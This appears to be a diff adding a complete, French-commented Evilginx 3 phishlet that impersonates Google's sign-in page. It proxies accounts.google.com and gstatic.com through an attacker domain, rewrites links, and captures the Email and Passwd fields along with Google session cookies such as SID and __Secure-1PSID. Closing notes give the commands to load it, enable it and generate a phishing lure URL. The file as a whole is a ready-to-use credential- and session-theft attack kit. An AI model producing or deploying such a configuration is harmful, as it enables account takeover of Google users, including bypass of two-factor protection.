@@ -1,0 +1,149 @@
+##########################################################
+# PHISHLET GOOGLE - VERSION SIMPLIFIÉE ET COMMENTÉE
+# Pour Evilginx 3.0+
+##########################################################
+
+# === METADATA ===
+name: "google"
+author: "@exemple"
+min_ver: "3.0.0"
+
+# === PROXY HOSTS ===
+# Tous les domaines et sous-domaines à proxifier
+proxy_hosts:
+  # Hôte principal - Page de login Google
+  - phish_sub: "accounts" # Votre domaine: accounts.votredomaine.com
+    orig_sub: "accounts" # Site réel: accounts.google.com
+    domain: "google.com"
+    session: true # Capturer les cookies de session
+    is_landing: true # Point d'entrée principal
+    auto_filter: true # Filtrage automatique des URLs
+
+  # APIs Google nécessaires
+  - phish_sub: "apis"
+    orig_sub: "apis"
+    domain: "google.com"
+    session: false
+    is_landing: false
+
+  # Ressources statiques (CSS, JS, images)
+  - phish_sub: "ssl"
+    orig_sub: "ssl"
+    domain: "gstatic.com"
+    session: false
+    is_landing: false
+
+  - phish_sub: "www"
+    orig_sub: "www"
+    domain: "gstatic.com"
+    session: false
+    is_landing: false
+
+# === SUB FILTERS ===
+# Remplacer les références aux domaines Google par vos domaines
+sub_filters:
+  # Remplacer "accounts.google.com" par "accounts.votredomaine.com"
+  - triggers_on: "accounts.google.com"
+    orig_sub: "accounts"
+    domain: "google.com"
+    search: "accounts.google.com"
+    replace: "{hostname}" # Variable dynamique
+    mimes: ["text/html", "application/json", "application/javascript"]
+
+  # Remplacer les URLs complètes
+  - triggers_on: "accounts.google.com"
+    orig_sub: "accounts"
+    domain: "google.com"
+    search: "https://accounts.google.com"
+    replace: "https://{hostname}"
+    mimes: ["text/html"]
+
+  # Remplacer les références aux ressources statiques
+  - triggers_on: "accounts.google.com"
+    orig_sub: "ssl"
+    domain: "gstatic.com"
+    search: "ssl.gstatic.com"
+    replace: "{hostname}"
+    mimes: ["text/html", "text/css"]
+
+# === AUTH TOKENS ===
+# Cookies de session critiques à capturer
+auth_tokens:
+  # Cookies de session principaux Google
+  - domain: ".google.com" # Note: point devant = tous sous-domaines
+    keys:
+      - "SID" # Session ID
+      - "SSID" # Secure Session ID
+      - "APISID" # API Session ID
+      - "SAPISID" # Secure API Session ID
+      - "HSID" # Hash Session ID
+
+  # Cookies sécurisés (HTTPS only)
+  - domain: ".google.com"
+    keys:
+      - "__Secure-1PSID" # Secure cookies Chrome
+      - "__Secure-1PAPISID"
+      - "__Secure-3PSID"
+      - "__Secure-3PAPISID"
+
+# === CREDENTIALS ===
+# Capture des identifiants (username/password)
+credentials:
+  # Champ email/username
+  username:
+    key: "Email" # Nom du champ POST
+    search: "(.*)" # Regex: capturer tout
+    type: "post" # Type de requête HTTP
+
+  # Champ mot de passe
+  password:
+    key: "Passwd" # Nom du champ POST (Google utilise "Passwd")
+    search: "(.*)"
+    type: "post"
+
+# === LOGIN ===
+# Configuration de la page de connexion
+login:
+  domain: "accounts.google.com"
+  path: "/ServiceLogin" # Chemin de la page de login
+
+# === AUTH URLS ===
+# URLs faisant partie du processus d'authentification
+auth_urls:
+  - "/ServiceLogin" # Page initiale
+  - "/signin/v2/identifier" # Étape 1: Email
+  - "/signin/v2/challenge" # Étape 2: Challenge (password/2FA)
+  - "/signin/v2/challenge/password" # Étape 2a: Password
+  - "/o/oauth2/auth" # OAuth flow
+  - "/ServiceLoginAuth" # Auth legacy
+
+# === LANDING URLS ===
+# URLs de redirection après authentification réussie
+landing_urls:
+  - "/myaccount" # Mon compte Google
+  - "https://mail.google.com" # Gmail
+  - "https://drive.google.com" # Google Drive
+  - "https://www.google.com" # Page d'accueil
+
+##########################################################
+# NOTES D'UTILISATION
+##########################################################
+#
+# 1. Enregistrer ce fichier dans : ./phishlets/private/google.yaml
+#
+# 2. Charger le phishlet :
+#    phishlets push private/google
+#
+# 3. Configurer le hostname :
+#    phishlets set private/google hostname accounts.votredomaine.com
+#
+# 4. Activer le phishlet :
+#    phishlets enable private/google
+#
+# 5. Créer un lure :
+#    lures create private/google /share/document
+#
+# 6. Obtenir l'URL du lure :
+#    lures get-url <id>
+#
+##########################################################
